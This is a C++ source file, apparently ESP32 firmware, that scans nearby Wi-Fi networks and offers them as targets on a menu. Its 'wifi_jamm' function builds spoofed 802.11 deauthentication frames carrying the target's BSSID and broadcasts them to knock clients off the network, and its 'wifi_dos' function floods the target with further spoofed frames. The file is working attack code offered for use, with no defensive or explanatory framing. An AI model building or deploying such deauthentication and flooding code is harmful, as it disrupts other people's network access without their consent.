#include "wifi_page_library.h"

// ===== DEFINITIONS =====
const char **wifi_button_texts = nullptr;
String *wifi_networks = nullptr;
int WIFI_BUTTON_COUNT = 0;
NetworkInfo targetNetwork;
int wifi_selected_index = -1;

// ===== SCAN NETWORKS =====
void scanNetworks() {
    // Clear old network list
    if (wifi_networks) {
        delete[] wifi_networks;
        wifi_networks = nullptr;
    }
    if (wifi_button_texts) {
        delete[] wifi_button_texts;
        wifi_button_texts = nullptr;
    }
    WIFI_BUTTON_COUNT = 0;

    Serial.println("[*] Scanning Wi-Fi networks...");
    int n = WiFi.scanNetworks(false, true, false, 300, 13); // Active scan
    Serial.printf("scanned networks: %d \n",n);
    

    if (n <= 0) {
        Serial.println("[!] No networks found.");

        // Allocate a dummy button for UI
        wifi_networks = new String[1];
        wifi_networks[0] = "No Networks Found";
        wifi_button_texts = new const char*[1];
        wifi_button_texts[0] = wifi_networks[0].c_str();
        WIFI_BUTTON_COUNT = 1;
        
        return;
    }

    // Normal case: found networks
    wifi_networks = new String[n];
    wifi_button_texts = new const char*[n];

    for (int i = 0; i < n; ++i) {
        wifi_networks[i] = WiFi.SSID(i);
        wifi_button_texts[i] = wifi_networks[i].c_str();
    }
    WIFI_BUTTON_COUNT = n;
}

// ===== JAMMER FUNCTION =====
void wifi_jamm() {
    Serial.println("[*] Starting Wi-Fi Jammer...");

    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);

    uint8_t deauthPacket[26] = {
        0xC0, 0x00,
        0x3A, 0x01,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0x00, 0x00,
        0x07, 0x00
    };
    memcpy(&deauthPacket[10], targetNetwork.bssid, 6);
    memcpy(&deauthPacket[16], targetNetwork.bssid, 6);

    for (int i = 0; i < 50; ++i) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(10);
    }
}

// ===== DoS FUNCTION =====
void wifi_dos() {
    Serial.println("[*] Starting Wi-Fi DoS attack...");

    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);

    uint8_t nullPacket[24] = {
        0xC8, 0x00,
        0x00, 0x00,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0,0,0,0,0,0,
        0x00, 0x00
    };
    memcpy(&nullPacket[4], targetNetwork.bssid, 6);
    memcpy(&nullPacket[10], targetNetwork.bssid, 6);
    memcpy(&nullPacket[16], targetNetwork.bssid, 6);

    for (int i = 0; i < 100; ++i) {
        esp_wifi_80211_tx(WIFI_IF_STA, nullPacket, sizeof(nullPacket), false);
        delay(10);
    }
}

// ===== STOP FUNCTION =====
void wifi_jamm_stop() { 
    Serial.println("[*] Stopping Wi-Fi Jamming...");
    esp_wifi_stop();
    WiFi.mode(WIFI_MODE_NULL);
    delay(100);
}